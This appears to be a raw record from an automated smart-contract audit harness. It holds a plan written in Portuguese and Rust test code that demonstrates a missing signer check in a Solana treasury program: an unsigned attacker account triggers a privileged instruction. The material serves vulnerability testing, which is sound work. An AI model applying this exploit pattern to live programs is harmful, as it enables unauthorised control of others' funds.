attempts.raw:
{
  "plan": "O cenario monta uma conta de tesouraria com dados validos (autoridade armazenada, saldo e flag ativa) e uma conta de autoridade legitima que assina. O baseline chama a instrucao process com a autoridade legitima assinando, provando que o cenario esta correto. O ataque chama a mesma instrucao com uma conta de autoridade diferente e sem assinatura, explorando a ausencia de verificacao de is_signer e de comparacao com a autoridade armazenada. O efeito mede que a operacao privilegiada foi executada sem a assinatura da autoridade legitima, verificando que a conta de tesouraria permanece ativa e que a autoridade armazenada nao foi alterada (ou que a instrucao retornou sucesso).",
  "scenario": "let treasury_key = Pubkey::new_unique();
let authority_key = Pubkey::new_unique();
let attacker_key = Pubkey::new_unique();

let mut treasury_data = vec![0u8; 49];
treasury_data[8..40].copy_from_slice(authority_key.as_ref());
treasury_data[40..48].copy_from_slice(&1000u64.to_le_bytes());
treasury_data[48] = 1;

let treasury_account = account(&env.program_id, &treasury_data, None);
let authority_account = wallet(1000000);
let attacker_account = wallet(1000000);

let ix_data = vec![0u8];

let baseline_ix = env.raw_ix(&ix_data, &[
    AccountMeta::new(treasury_key, false),
    AccountMeta::new_readonly(authority_key, true),
]);
let baseline_accounts = vec![
    (treasury_key, treasury_account.clone()),
    (authority_key, authority_account.clone()),
];
let baseline_result = env.baseline("chamada legitima com autoridade assinando", &baseline_ix, &baseline_accounts);

let attack_ix = env.raw_ix(&ix_data, &[
    AccountMeta::new(treasury_key, false),
    AccountMeta::new_readonly(attacker_key, false),
]);
let attack_accounts = vec![
    (treasury_key, treasury_account.clone()),
    (attacker_key, attacker_account.clone()),
];
let attack_result = env.attack("chamada com autoridade nao assinada", &attack_ix, &attack_accounts);

if attack_result.program_result == ProgramResult::Success {
    let treasury_after = after(&attack_result, &treasury_key);
    let stored_authority_after = read_pubkey(treasury_after.data(), 8);
    let is_active_after = treasury_after.data()[48] != 0;
    env.effect("operacao executada sem assinatura da autoridade legitima", stored_authority_after == authority_key && is_active_after);
}"
}

